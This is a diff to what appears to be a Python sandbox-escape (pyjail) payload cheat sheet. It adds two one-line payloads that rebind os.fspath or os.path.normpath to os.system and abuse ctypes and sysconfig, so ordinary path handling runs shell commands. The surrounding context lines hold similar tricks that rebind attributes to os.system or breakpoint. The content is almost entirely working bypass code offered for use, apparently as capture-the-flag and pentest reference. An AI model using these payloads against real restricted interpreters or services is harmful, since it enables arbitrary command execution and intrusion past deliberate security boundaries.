@@ -185,6 +185,8 @@ from os import system as __getattr__; from __main__ import sh
 import sys;sys.stderr.flush=breakpoint
 import sys;sys.stdout.flush=breakpoint
 import pdb,builtins as e;e.set=breakpoint;a
+import ctypes; import sys; import os; [os.system for os.fspath in [os.system]]; ctypes.cdll[sys.executable]
+import os; import sys; [sys for sys.prefix in [sys.executable]]; [sys for os.path.normpath in [os.system]]; import sysconfig
 
 ```
 ### Bypass parsers using comments and encodings
